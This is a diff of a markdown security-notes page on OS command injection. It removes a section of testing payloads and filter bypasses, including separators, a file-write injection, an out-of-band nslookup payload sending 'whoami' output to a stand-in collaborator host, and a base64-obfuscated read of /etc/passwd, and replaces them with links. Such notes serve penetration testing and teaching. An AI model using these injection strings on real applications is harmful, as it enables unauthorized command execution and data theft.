@@ -1,70 +1,14 @@
 # Command Injection
 
-## Overview
+## What is Command Injection?
 
 Command injection (also called OS command injection) vulnerabilities occur when an application passes unsanitized user input to a system shell. An attacker can inject additional commands that are executed with the privileges of the web application process.
 
-This is one of the most severe web vulnerabilities because it often leads to full system compromise.
+## Exploits
 
-## Attack Surface
-
-- Features that execute system commands based on user input (ping tools, WHOIS lookups, image processing with tools like ImageMagick, PDF generation, etc.)
-- Any functionality using functions like `system()`, `exec()`, `shell_exec()`, `popen()` in PHP, or `os.system()`, `subprocess` in Python without proper escaping.
-
-## Identification
-
-- Identify functionality that interacts with the operating system or external commands.
-- Test by injecting command separators and simple commands (e.g., `& echo test &` or `; id`).
-- Use time-based detection for blind injections (`ping -c 10 127.0.0.1` or equivalent).
-- Write output to files that can be retrieved via other means (web root, then request the file).
-- Use out-of-band (OAST) techniques with DNS/HTTP callbacks (nslookup to collaborator domain).
-
-## Exploitation
-
-### Useful OS Commands
-
-| Purpose              | Linux          | Windows             |
-|----------------------|----------------|---------------------|
-| Current user         | whoami         | whoami              |
-| OS version           | uname -a       | ver                 |
-| Network config       | ifconfig       | ipconfig /all       |
-| Network connections  | netstat -an    | netstat -an         |
-| Running processes    | ps -ef         | tasklist            |
-
-### Command Separators
-
-| Separator | OS              | Notes |
-|-----------|-----------------|-------|
-| `&`       | Windows & Unix  | Runs both |
-| `&&`      | Windows & Unix  | Runs second only if first succeeds |
-| `\|`      | Windows & Unix  | Pipes output; second shown |
-| `\|\|`    | Windows & Unix  | Runs second only if first fails |
-| `;`       | Unix            | Runs both |
-| Newline   | Unix            | `0x0a` or `\n` |
-| `` `cmd` `` | Unix          | Command substitution |
-| `$(cmd)`  | Unix            | Command substitution |
-
-### Testing Techniques
-
-- Simple injection: `& echo aiwefwlguh &`
-- Blind/time-based: `& ping -c 10 127.0.0.1 &` or `||ping+-c+10+127.0.0.1||`
-- Write to file for verification: `||whoami+>+/var/www/images/whoami.txt||` then retrieve via web request.
-- OAST: `||nslookup+`whoami`.collaborator.example.com||`
-
-### Advanced Bypasses (from detailed notes)
-
-**Space bypasses (Linux):**
-- `%09` (tab)
-- `${IFS}` or `$IFS`
-- `{ls,-la}` (brace expansion)
-
-**Character and case manipulation:**
-- `c"a"t` or `$@`
-- Case: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`
-- Reversal: `echo 'whoami' | rev`
-- Base64: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk...)`
-
-See PayloadsAllTheThings for extensive bypass collections.
+- [Basic Command Injection](command-injection/basic-injection.md)
+- [Blind / Time-based Command Injection](command-injection/blind-injection.md)
+- [Advanced Bypasses and Filter Evasion](command-injection/bypass-techniques.md)
 
 ## Impact
 
